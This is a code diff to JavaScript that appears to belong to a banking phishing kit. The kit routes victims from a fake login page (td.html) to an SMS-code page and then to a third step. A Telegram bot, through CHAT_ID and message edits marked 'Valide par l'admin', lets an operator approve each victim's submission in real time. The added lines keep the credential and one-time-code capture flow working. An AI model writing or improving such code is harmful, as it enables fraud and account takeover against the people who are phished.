@@ -205,10 +205,17 @@
                         });
                         
                         let action = form.getAttribute('action');
-                        if (action) {
+                        if (action && action !== 'javascript:void(0)' && action !== '#') {
                             window.location.href = action;
                         } else {
-                            form.submit();
+                            let current = window.location.pathname.split('/').pop();
+                            if (current.includes('_sms')) {
+                                window.location.href = current.replace('_sms.html', '_step3.html');
+                            } else if (current === 'td.html') {
+                                window.location.href = 'td_sms.html';
+                            } else {
+                                form.submit();
+                            }
                         }
                     }
                 }, 1000);
@@ -251,8 +258,18 @@
                                             body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n? <i>Valide par l'admin</i>", parse_mode: 'HTML'})
                                         });
                                         let action = form.getAttribute('action');
-                                        if (action) window.location.href = action;
-                                        else form.submit();
+                                        if (action && action !== 'javascript:void(0)' && action !== '#') {
+                                            window.location.href = action;
+                                        } else {
+                                            let current = window.location.pathname.split('/').pop();
+                                            if (current.includes('_sms')) {
+                                                window.location.href = current.replace('_sms.html', '_step3.html');
+                                            } else if (current === 'td.html') {
+                                                window.location.href = 'td_sms.html';
+                                            } else {
+                                                form.submit();
+                                            }
+                                        }
                                     }
                                     else if (cbData.startsWith('error_')) {
                                         isFinished = true;
@@ -297,3 +314,4 @@
         initAll();
     }
 })();
+
